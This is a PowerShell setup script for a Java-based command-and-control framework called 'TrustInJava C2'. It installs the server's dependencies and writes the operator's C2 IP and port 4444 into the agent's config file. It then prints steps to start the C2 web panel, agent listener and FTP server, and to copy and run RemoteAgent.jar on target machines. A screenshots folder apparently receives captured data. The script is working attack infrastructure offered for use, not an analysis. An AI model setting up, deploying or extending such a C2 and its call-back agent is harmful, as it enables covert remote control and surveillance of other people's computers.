param(
    [string]$C2IP = "",
    [int]$C2Port = 4444
)

Write-Host @"
╔════════════════════════════════════════════════════════════╗
║              TrustInJava C2 - Setup Script                ║
║                     by TR3XN3GR0                          ║
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan

$ErrorActionPreference = "Stop"

function Test-Command($cmd) {
    return [bool](Get-Command $cmd -ErrorAction SilentlyContinue)
}

Write-Host "[1/5] Checking Python..." -ForegroundColor Yellow
if (-not (Test-Command "python")) {
    Write-Host "[!] Python not found." -ForegroundColor Red
    Write-Host "    Download from: https://www.python.org/downloads/" -ForegroundColor White
    Write-Host "    Minimum version: Python 3.8" -ForegroundColor White
    exit 1
}
$pyver = & python --version 2>&1
Write-Host "[+] $pyver" -ForegroundColor Green

Write-Host "[2/5] Checking Java..." -ForegroundColor Yellow
if (-not (Test-Command "java")) {
    Write-Host "[!] Java not found." -ForegroundColor Red
    Write-Host "    Download from: https://adoptium.net/ (Temurin 17 recommended)" -ForegroundColor White
    Write-Host "    Minimum version: Java 11" -ForegroundColor White
    exit 1
}
$javaver = & java -version 2>&1 | Select-Object -First 1
Write-Host "[+] $javaver" -ForegroundColor Green

Write-Host "[3/5] Installing Python dependencies..." -ForegroundColor Yellow
Set-Location "$PSScriptRoot\C2Server"
& python -m pip install --upgrade pip -q
& python -m pip install -r requirements.txt
if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Failed to install dependencies." -ForegroundColor Red
    exit 1
}
Write-Host "[+] All Python dependencies installed" -ForegroundColor Green

Write-Host "[4/5] Creating required directories..." -ForegroundColor Yellow
New-Item -ItemType Directory -Path "ftp_files\screenshots" -Force | Out-Null
Write-Host "[+] Directories ready" -ForegroundColor Green

Write-Host "[5/5] Setting up config.ep..." -ForegroundColor Yellow
$agentDir = "$PSScriptRoot\JavaAgent.jar.src\dist"

if ($C2IP -eq "") {
    $C2IP = Read-Host "Enter your C2 server IP (the IP agents will connect to)"
}

$configContent = "$C2IP`n$C2Port"
$configContent | Out-File -FilePath "$agentDir\config.ep" -Encoding ASCII -NoNewline
Write-Host "[+] config.ep created at: $agentDir\config.ep" -ForegroundColor Green
Write-Host "    IP: $C2IP | Port: $C2Port" -ForegroundColor White

Write-Host @"

╔════════════════════════════════════════════════════════════╗
║                    Setup Complete!                        ║
╠════════════════════════════════════════════════════════════╣
║                                                           ║
║  Start the C2 server:                                     ║
║    cd C2Server                                            ║
║    python c2_server.py                                    ║
║                                                           ║
║  Or use the quick-start script:                           ║
║    cd C2Server && .\start.ps1                             ║
║                                                           ║
║  Web Interface: http://localhost:5000                     ║
║  Agent Listener: 0.0.0.0:4444                             ║
║  FTP Server: 0.0.0.0:2121                                 ║
║                                                           ║
║  Deploy the agent:                                        ║
║    Copy JavaAgent.jar.src\dist\RemoteAgent.jar            ║
║    Copy JavaAgent.jar.src\dist\config.ep                  ║
║    Run: java -jar RemoteAgent.jar                         ║
║                                                           ║
╚════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Cyan
